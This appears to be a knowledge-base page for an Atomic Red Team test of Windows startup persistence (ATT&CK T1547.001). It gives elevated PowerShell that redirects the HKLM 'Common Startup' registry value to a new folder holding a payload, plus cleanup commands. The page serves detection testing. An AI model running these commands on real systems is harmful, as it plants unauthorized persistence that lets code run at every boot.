---
atomic_guid: "acfef903-7662-447e-a391-9c91c2f00f7b"
title: "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.001"
attack_technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "acfef903-7662-447e-a391-9c91c2f00f7b"
  - "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test will modify the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders -V "Common Startup" 
value to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution#^t1547001-registry-run-keys---startup-folder|T1547.001: Registry Run Keys / Startup Folder]]

## Input Arguments

### new_startup_folder

- description: new startup folder to replace standard one
- type: string
- default: $env:TMP\atomictest\

### payload

- description: executable to be placed in new startup location 
- type: string
- default: C:\Windows\System32\calc.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "#{new_startup_folder}"
```

### Cleanup

```powershell
Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
Remove-Item "#{new_startup_folder}" -Recurse -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml)
